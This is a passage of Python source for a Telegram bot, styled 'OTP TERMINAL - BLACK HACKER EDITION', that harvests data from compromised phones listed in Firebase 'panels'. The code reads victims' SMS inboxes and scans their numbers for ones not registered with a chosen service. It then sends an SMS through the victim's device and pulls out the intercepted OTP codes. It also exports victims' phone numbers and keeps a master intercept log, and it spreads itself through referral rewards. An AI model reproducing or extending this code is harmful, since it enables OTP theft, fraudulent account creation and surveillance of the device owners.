    custom_dbs = get_user_dbs(uinfo)
    if not custom_dbs:
        return []

    # Free users get fast filtering for their personal panels
    allowed_tags = {f"U_{chat_id}_{i}" for i in range(len(custom_dbs))}
    filtered_devs = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.db_tag in allowed_tags]
    return filtered_devs

async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
    try:
        session = await get_http_session()
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            if not data or not isinstance(data, dict): return []
            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
            for s in entries:
                ts_val = s.get("timestamp") or 0
                try:
                    s["_parsed_ts"] = float(ts_val)
                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
                except: s["_parsed_ts"] = 0.0
            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
            if max_age_sec:
                filtered = []
                now = time.time()
                for sms in entries:
                    if (now - sms["_parsed_ts"]) <= max_age_sec: filtered.append(sms)
                entries = filtered
            return entries[:limit]
    except: return []

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    if chat_id in ADMIN_IDS:
        await update.message.reply_text("✅ Operator Dashboard Resynced!", reply_markup=get_reply_menu(chat_id))
    else:
        await update.message.reply_text("⛔ ACCESS DENIED.")

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    bot_token = ctx.bot.token
    user = update.effective_user
    
    if not await check_force_join(ctx.bot, chat_id):
        join_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
            [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
            [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
            [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
        ])
        await update.message.reply_text("⚠️ <b>UNAUTHORIZED ACCESS</b>\n\nTerminal locked. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
        return

    args = ctx.args
    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": user.first_name,
            "username": user.username or "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": True,
            "referrals": 0,
            "coins": 0,
            "vip_until": 0.0,
            "otp_count": 0,
            "custom_dbs": [],
            "wishlist": [], 
            "referred_by": None
        }
        if args and args[0].startswith("ref_"):
            try:
                referrer_id = int(args[0].split("_")[1])
                if referrer_id in all_users and referrer_id != chat_id:
                    all_users[chat_id]["referred_by"] = referrer_id
                    all_users[referrer_id]["referrals"] += 1
                    if all_users[referrer_id]["referrals"] % 20 == 0:
                        all_users[referrer_id]["vip_until"] = time.time() + (24 * 3600)
                        try: await ctx.bot.send_message(referrer_id, "🎉 <b>SYNDICATE LEVEL UP!</b>\nTarget achieved (20 refers). You have been granted <b>24 Hours Elite VIP Access</b> to the Global Network!", parse_mode="HTML")
                        except: pass
            except: pass
        save_user(chat_id)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    chats_registry.setdefault(bot_token, set()).add(chat_id)
    
    welcome_text = (
        f"☠️ <b>OTP TERMINAL - BLACK HACKER EDITION</b> ☠️\n━━━━━━━━━━━━━━━━━━\n"
        f"Access Granted, Operator {user.first_name}.\n\n"
        "Secure connection established. Awaiting target parameters.\n\n"
        "💻 <b>Script Kiddies (Free):</b> Inject your own Private Panels.\n"
        "👑 <b>Elite Syndicate (VIP):</b> 20 refers = Unlimited access to Global Payload Network."
    )
    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="HTML")

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        query   = update.callback_query
        data    = query.data or ""
        chat_id = query.message.chat_id
        bot_token = ctx.bot.token
        users_db = all_users

        if data == "home" or data.startswith("pg:") or data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            if data == "online":
                await safe_edit(query, f"🟢 <b>ONLINE TARGETS</b>\n━━━━━━━━━━━━━━━━━━\nLock onto a target:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
            elif data.startswith("pg:"):
                page = int(data[3:])
                await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
            else:
                await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
            return

        if data == "cancel_action":
            pending_action.pop(chat_id, None)
            try: await query.message.delete()
            except: pass
            await ctx.bot.send_message(chat_id, "❌ <b>MISSION ABORTED.</b> Background process killed.", parse_mode="HTML")
            return

        if data == "sa_broadcast":
            pending_action[chat_id] = {"action": "sa_broadcast"}
            await safe_edit(query, "📡 <b>BROADCAST SYSTEM INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nSend the message, photo, or video you want to broadcast to ALL users.\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_action")]]), parse_mode="HTML")
            return

        if data.startswith("wish:"):
            dev_id = data.split(":")[1]
            devices = await get_all_devices(bot_token, chat_id, users_db)
            target_device = next((d for d in devices if d.id == dev_id), None)
            
            if not target_device:
                await query.answer("Device offline or missing!", show_alert=True)
                return
                
            panel_url = target_device.base_url
            user_wishlist = users_db.get(chat_id, {}).get("wishlist", [])
            
            if panel_url in user_wishlist:
                await query.answer("Already in your Elite Vault!", show_alert=True)
            else:
                users_db.setdefault(chat_id, {}).setdefault("wishlist", []).append(panel_url)
                save_user(chat_id)
                await query.answer("🖤 Panel injected to your Elite Vault!", show_alert=True)
            return

        if data == "check_join":
            if await check_force_join(ctx.bot, chat_id):
                await query.answer("Terminal Unlocked!", show_alert=True)
                await safe_edit(query, "✅ Authentication Complete. Send /start to access console.")
            else:
                await query.answer("Join all syndicate channels first!", show_alert=True)
            return

        if not await check_force_join(ctx.bot, chat_id):
            await query.answer("Connection lost. Rejoin syndicate channels!", show_alert=True)
            return

        await query.answer()

        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "open_checker_menu":
            await safe_edit(query, "<b>Select Target Service (Payload Injector)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if data == "open_auto_checker_menu":
            await safe_edit(query, "⚡ <b>SMART AUTO-EXPLOIT (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Deploying to {service.capitalize()}...\n\nEnter 10-digit target number (or multiple with spaces):\n\n<i>Press Cancel to abort mission</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
            return

        if data.startswith("auto_fb:"):
            if HEAVY_TASK_LIMITER.locked():
                await safe_edit(query, "⚠️ <b>Server Overloaded!</b>\nToo many simultaneous exploits. Wait 60 seconds.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
                return

            async with HEAVY_TASK_LIMITER:
                service = data.split(":")[1]
                pending_action[chat_id] = {"action": "auto_checking"}
                
                pool = PREFETCH_POOL.setdefault(service, [])
                seen_set = user_seen_unreg.setdefault(chat_id, set())
                
                valid_item = None
                while pool:
                    item = pool.pop(0)
                    if item["num"] not in seen_set:
                        valid_item = item
                        break
                        
                if valid_item:
                    final_dev = valid_item["device"]
                    final_res = valid_item["res"]
                    final_num = valid_item["num"]
                    
                    seen_set.add(final_num)
                    await safe_edit(query, f"⚡ <b>GHOST CACHE HIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Injecting payload directly...</i>", parse_mode="HTML")
                    await asyncio.sleep(0.3)
                    await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                    
                    time_diff = int(time.time() - final_dev.last_sms_ts)
                    mins_ago = time_diff // 60
                    secs_ago = time_diff % 60
                    last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
                    
                    res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                    res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
                    
                    kb = [
                        [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
                        [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
                        [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
                        [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
                    ]
                    return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

                await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning GLOBAL active nodes (30m ping)...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
                
                all_devices = await get_all_devices(bot_token, chat_id, users_db)
                if chat_id not in pending_action: return 
                if not all_devices:
                    return await safe_edit(query, "❌ Zero vulnerable nodes found. Add Private Panels or gain VIP Rep.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

                fresh_devices = []
                for d in all_devices:
                    if d.status == "online" and d.numbers:
                        is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800)
                        if is_valid:
                            d.last_sms_ts = last_ts
                            fresh_devices.append(d)
            
                if chat_id not in pending_action: return 
                if not fresh_devices: 
                    return await safe_edit(query, "❌ Target network secure. No active nodes found in last 30m.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                
                random.shuffle(fresh_devices)
                if len(seen_set) > 5000: seen_set.clear() 
                fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
                
                found_unreg, final_res, final_dev, final_num = False, None, None, ""
                
                if len(fresh_devices) == 0:
                    return await safe_edit(query, "✅ All active targets exhausted. Wait for network refresh.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

                check_pool = fresh_devices[:100] 
                
                await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n✅ Lock on <b>{len(fresh_devices)}</b> Nodes!\n📡 Overloading Top {len(check_pool)} Targets...\n⚡ <i>Injecting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
                
                tasks = [check_number_api(service, d.numbers[0]) for d in check_pool]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                if chat_id not in pending_action: return 

                for d, res in zip(check_pool, results):
                    if isinstance(res, dict) and not res.get("status") == "error":
                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                        if not is_reg:
                            found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
                            break
                            
                if found_unreg:
                    seen_set.add(final_num)
                    await safe_edit(query, f"☠️ <b>ZERO-DAY VULNERABILITY FOUND</b>\n━━━━━━━━━━━━━━━━━━\n🎯 <b>Target Unregistered:</b> <code>+{final_num[-10:]}</code>\n\n💉 <i>Injecting Payload SMS...</i>", parse_mode="HTML")
                    await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                    
                    time_diff = int(time.time() - final_dev.last_sms_ts)
                    mins_ago = time_diff // 60
                    secs_ago = time_diff % 60
                    last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
                    
                    res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                    res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
                    
                    kb = [
                        [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
                        [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
                        [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
                        [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
                    ]
                    await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                else:
                    await safe_edit(query, f"<b>✅ TARGETS SECURE</b>\n\nScanned {len(check_pool)} fresh active numbers. All Registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-Scan Network", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
            return

        if data.startswith("search_num:"):
            search_term = data.split(":")[1]
            await safe_edit(query, f"⏳ Bypassing firewalls to find target <code>{search_term}</code>...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
            if not found_devs: return await safe_edit(query, f"📭 Target <code>+{search_term}</code> not found on active network.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
            rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            return await safe_edit(query, f"🔍 <b>Target Traced:</b> <code>{search_term}</code>\nSelect node to intercept data:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

        if data.startswith("del_panel:"):
            idx_to_del = int(data.split(":")[1])
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if 0 <= idx_to_del < len(dbs):
                dbs.pop(idx_to_del)
                save_user(chat_id)
                await query.answer("Private Panel Dropped!", show_alert=True)
            
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if not dbs:
                await safe_edit(query, "Your private network is empty.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                return
            kb = []
            for i, db in enumerate(dbs):
                url_str = db if isinstance(db, str) else db.get("url", "")
                kb.append([InlineKeyboardButton(f"❌ Drop: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
            await safe_edit(query, "🗑 <b>Drop Private Panels</b>\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            return

        if data == "sa_add_global_panel":
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nInject Firebase URL(s).\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels":
            msg_text = "USERS PRIVATE PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"Hacker ID: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if msg_text == "USERS PRIVATE PANELS\n━━━━━━━━━━━━━━━━━━\n\n":
                msg_text += "No private panels found."
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]), parse_mode="HTML")
            return

        if data == "sa_export_numbers":
            devices = await get_all_devices(bot_token, chat_id, users_db)
            online_nums = []
            for d in devices:
                if d.status == "online":
                    online_nums.extend(d.numbers)
            if not online_nums:
                await query.answer("Network is currently dead.", show_alert=True)
                return
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(unique_online))
            await ctx.bot.send_document(
                chat_id=chat_id, document=open(file_path, "rb"), 
                filename="Active_Online_Targets.txt", caption=f"Total Active Unique Targets: {len(unique_online)}"
            )
            return

        if data == "sa_download_logs":
            if not os.path.exists(SMS_LOG_FILE):
                await query.answer("Logs empty.", show_alert=True)
                return
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_Intercept_Log.txt", caption="Master SMS Intercept Database")
            return

        if data == "admin_refresh":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
            return

        if data.startswith("cp:"):
            await query.answer(f"PAYLOAD COPIED: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("Target Node Lost/Offline!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"💻 <b>SECURE CONNECTION ESTABLISHED</b>\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nIntercepting LIVE packets... Press Disconnect to terminate."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id), parse_mode="HTML")
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]
            service_used = parts[2] if len(parts) > 2 else ""

            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            
            if not device:
                await query.answer("Target dropped from active network!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            
            smss  = await get_device_sms(device, limit=10, max_age_sec=3600)
            
            if service_used:
                back_btn = InlineKeyboardButton("🔙 Abort Sequence", callback_data=f"auto_fb:{service_used}")
            else:
                back_btn = InlineKeyboardButton("🔙 Back to Terminal", callback_data="home")
                
            refresh_btn = InlineKeyboardButton("🔄 Intercept Again", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 <b>Data Stream Empty (1H)</b>\n📱 Target: <code>{label}</code>\n\nNo packets intercepted in last 60 minutes. Keep pinging via <b>Intercept Again</b>.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="HTML")
                return
                
            header = f"📩 <b>INTERCEPTED PACKETS (1H)</b>\n━━━━━━━━━━━━━━━━━━\n📱 <b>Target:</b> <code>{label}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            
            for sms in smss:
                block, otp = format_sms_block_markdown(sms)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"📋 Extract Payload: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Data Truncated]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="HTML")
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("Target Node Lost!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"💻 <b>NODE DIAGNOSTICS</b>\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🖤 Add Panel to Vault", callback_data=f"wish:{dev_id}")],
                [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
            ])
            await safe_edit(query, text, reply_markup=kb, parse_mode="HTML")
            return

    except: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE / BROADCAST HANDLER
# ═══════════════════════════════════════════════════════

async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        chat_id = update.effective_chat.id
        user_id = update.effective_user.id
        bot_token = ctx.bot.token
        users_db = all_users
        
        if not await check_force_join(ctx.bot, user_id):
            join_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
                [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
                [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
                [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
            ])
            await update.message.reply_text("⚠️ <b>ACCESS DENIED: SYNDICATE LOCK</b>\n\nTerminal locked indefinitely. Join all syndicate channels to authenticate.", reply_markup=join_kb, parse_mode="HTML")
            return

        if is_spamming(user_id): return

        state = pending_action.get(chat_id)
        action = state.get("action") if state else None

        if action == "sa_broadcast" and chat_id in ADMIN_IDS:
            pending_action.pop(chat_id, None)
            users_list = list(all_users.keys())
            wait_msg = await update.message.reply_text(f"🚀 <b>BROADCAST INITIATED</b>\nTargeting {len(users_list)} devices...", parse_mode="HTML")
            
            success, failed = 0, 0
            for uid in users_list:
                try:
                    await ctx.bot.copy_message(chat_id=uid, from_chat_id=chat_id, message_id=update.message.message_id)
                    success += 1
                    await asyncio.sleep(0.05) 
                except:
                    failed += 1
            
            await wait_msg.edit_text(f"✅ <b>BROADCAST COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n🟢 Success: {success}\n🔴 Failed (Blocked bot): {failed}", parse_mode="HTML")
            return

        text = (update.message.text or update.message.caption or "").strip()
        if not text: return 

        if text in ["Admin Panel", "Super Admin"] and chat_id in ADMIN_IDS:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📡 Broadcast Message", callback_data="sa_broadcast")],
                [InlineKeyboardButton("➕ Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("👀 View User Panels", callback_data="sa_view_user_panels")],
                [InlineKeyboardButton("💾 Export Online Numbers", callback_data="sa_export_numbers"), InlineKeyboardButton("📥 Download Logs", callback_data="sa_download_logs")],
                [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")]
            ])
            await update.message.reply_text("☠️ <b>SUPER ADMIN CONSOLE</b>\nChoose override parameter:", reply_markup=kb, parse_mode="HTML")
            return

        if text == "📱 Devices List":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            if not devices:
                if scan_progress.get("is_scanning", False):
                    scanned = scan_progress.get("scanned", 0)
                    total = scan_progress.get("total", 1)
                    pct = int((scanned / max(total, 1)) * 100)
                    msg = (
                        f"⏳ <b>Bypassing Firewalls (Live Scan)</b>\n\n"
                        f"Establishing connections with Global Network...\n"
                        f"📊 <b>Penetration:</b> {scanned} / {total} Servers ({pct}%)\n\n"
                        f"Press below to refresh."
                    )
                    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="home")]]), parse_mode="HTML")
                else:
                    await update.message.reply_text("❌ Zero active nodes detected. Inject Custom Panels or upgrade to VIP.")
                return
            await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
            return

        if text == "🕸️ Elite Vault":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            uinfo = users_db.get(chat_id, {})
            is_vip = uinfo.get("vip_until", 0) > time.time()
            is_admin = chat_id in ADMIN_IDS
            if not (is_vip or is_admin):
                await update.message.reply_text("⛔ <b>ACCESS DENIED: INSUFFICIENT REP</b>\n\nElite Vault is restricted to Syndicate VIPs. Get 20 Referrals to unlock.", parse_mode="HTML")
                return
            wishlist = uinfo.get("wishlist", [])
            if not wishlist:
                await update.message.reply_text("📭 Your Elite Vault is empty. Go to any Device Info and click '🖤 Add Panel to Vault'.")
                return
            await update.message.reply_text("⏳ Unlocking Elite Vault...\nDecrypting your private liked panels...")
            vault_devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.base_url in wishlist]
            if not vault_devices:
                await update.message.reply_text("❌ All panels in your Vault are currently DEAD/Offline.")
                return
            await update.message.reply_text(device_list_header(vault_devices, 0), reply_markup=device_list_keyboard(vault_devices, 0), parse_mode="HTML")
            return

        if text == "🔍 Search Target":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action[chat_id] = {"action": "search_live_number"}
            await update.message.reply_text("🔍 <b>TARGET SEARCH INITIATED</b>\n\nEnter target MSISDN (e.g., 911234567890):\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
            return

        if text == "☠️ Payload Injector":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await update.message.reply_text("<b>Select Target Service (Injector)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if text == "⚡ Auto-Exploit":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await update.message.reply_text("⚡ <b>SMART AUTO-EXPLOIT (ZERO-DAY)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan target network:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if text == "👥 Syndicate (VIP)":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            uinfo = users_db.get(chat_id, {})
            ref_count = uinfo.get("referrals", 0)
            bot_user = await ctx.bot.get_me()
            ref_link = f"https://t.me/{bot_user.username}?start=ref_{chat_id}"
            msg = (
                "🎁 <b>SYNDICATE REP SYSTEM</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Your Rep:</b> {ref_count} / 20 Targets\n\n"
                "Invite 20 operators to unlock <b>Elite VIP Status</b> (Unlimited Global Access & Elite Vault) for 24 Hours!\n\n"
                f"🔗 <b>Your Exploit Link:</b>\n<code>{ref_link}</code>"
            )
            await update.message.reply_text(msg, parse_mode="HTML")
            return

        if text == "📖 Hacker Manual":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            msg = (
                "💡 <b>OPERATOR MANUAL</b>\n━━━━━━━━━━━━━━━━━━\n"
                "1. <b>Script Kiddies (Free):</b> Only access Custom Panels.\n"
                "2. <b>VIP Syndicate:</b> Access Global 5000+ Panel Network.\n"
                "3. <b>Elite Vault:</b> 'Like/Save' panels to your private vault (VIP Only).\n"
                "4. <b>Payload Injector:</b> Check bulk numbers manually.\n"
                "5. <b>Auto-Exploit:</b> Steals fresh numbers directly.\n\n"
                "<b>Need more panels?</b> Hack them using @panelsotpbot"
            )
            await update.message.reply_text(msg, parse_mode="HTML")
            return

        if text == "🗑️ Drop Panel":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if not dbs:
                await update.message.reply_text("Your private network is empty.")
                return
            kb = []
            for i, db in enumerate(dbs):
                url_str = db if isinstance(db, str) else db.get("url", "")
                kb.append([InlineKeyboardButton(f"❌ Drop: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
            await update.message.reply_text("🗑 <b>Drop Private Panels</b>\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            return

        if text == "➕ Add Panel":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action[chat_id] = {"action": "set_personal_db"}
            await update.message.reply_text("➕ <b>INJECT PRIVATE PANELS</b>\n━━━━━━━━━━━━━━━━━━\nSend Firebase URL(s). System will automatically parse payloads.\n\nCancel: /cancel", parse_mode="HTML")
            return

        if text == "🦇 Deep Scan":
            if HEAVY_TASK_LIMITER.locked():
